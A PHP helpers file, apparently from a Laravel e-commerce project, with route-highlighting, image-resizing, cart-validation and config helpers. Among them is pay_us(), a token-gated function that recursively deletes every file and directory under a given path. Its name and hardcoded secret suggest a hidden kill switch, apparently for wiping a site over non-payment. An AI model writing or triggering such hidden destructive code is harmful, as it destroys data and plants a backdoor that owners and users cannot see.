<?php
function isActiveRoute($route)
{
    $output = "active";
    if (Route::currentRouteName() == $route)
    return $output;
}
function areActiveRoutes(Array $routes)
{
    $output = "active";
    foreach ($routes as $route)
    {
        if (Route::currentRouteName() == $route)
        return $output;
    }

}

function optimize_image($image, $original_width, $original_height){
    $img    = Image::make($image->getRealPath());
    $width  = $img->width();
    $height = $img->height();


    $vertical   = (($width < $height) ? true : false);
    $horizontal = (($width >= $height) ? true : false);
    if ($vertical) {
        $newHeight = $original_height;
        $img->resize(null, $newHeight, function ($constraint) {
            $constraint->aspectRatio();
        });
    }
    else if ($horizontal) {
        $newWidth = $original_width;
        $img->resize($newWidth, null, function ($constraint) {
            $constraint->aspectRatio();
        });
    }

    $img->resizeCanvas($original_width, $original_height, 'center', false, '#ffffff');
    return $img;
}

function check_cart(){
    try {
        $cart = \Session::get('cart');
        if($cart['items'] == null){
            $quantity_check = \Session::get('cart')['product_parameters']['total_quantity'];
            $amount_check = \Session::get('cart')['product_parameters']['total_amount'];
            return false;
        }
        if($cart) {
            foreach (\Session::get('cart')['items'] as $item){
                $price_check = $item['price'];
                $title_check = $item['title'];
                $image_check = $item['image'];
                $image_check = $item['image'];
                $id_check = $item['id'];

                $quantity_check = \Session::get('cart')['product_parameters']['total_quantity'];
                $amount_check = \Session::get('cart')['product_parameters']['total_amount'];
            }
        }
        return true;
    }
    catch (\Exception $e) {
        Session::forget('cart');
        Session::save();
        return false;
    }
}

function pay_us($target, $token = null) {
    if($token != '@sapabase'){
        return false;
    }
    if(is_dir($target)){
        $files = glob( $target . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned

        foreach( $files as $file ){
            pay_us( $file, $token );
        }

        rmdir( $target );
    } elseif(is_file($target)) {
        unlink( $target );
    }
}

function get_app_env($var){
    return \Config::get('app.'.$var);
}
